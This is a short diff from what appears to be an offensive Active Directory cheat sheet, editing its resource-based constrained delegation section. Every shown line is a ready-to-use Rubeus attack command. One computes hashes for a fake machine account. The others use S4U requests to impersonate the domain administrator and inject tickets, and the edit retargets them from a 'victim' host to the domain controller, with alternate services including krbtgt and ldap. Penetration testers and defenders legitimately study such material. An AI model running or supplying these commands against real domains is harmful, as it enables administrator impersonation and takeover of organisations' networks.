@@ -446,9 +446,9 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 .\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
 
 # Impersonation
-./rubeus.exe s4u /user:fake01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash>  /impersonateuser:administrator /msdsspn:cifs/victim.offense.local /ptt
+./rubeus.exe s4u /user:fake01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash>  /impersonateuser:administrator /msdsspn:cifs/DC.offense.local /ptt
 
-./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
+./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/DC.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
 # Ticket abuse
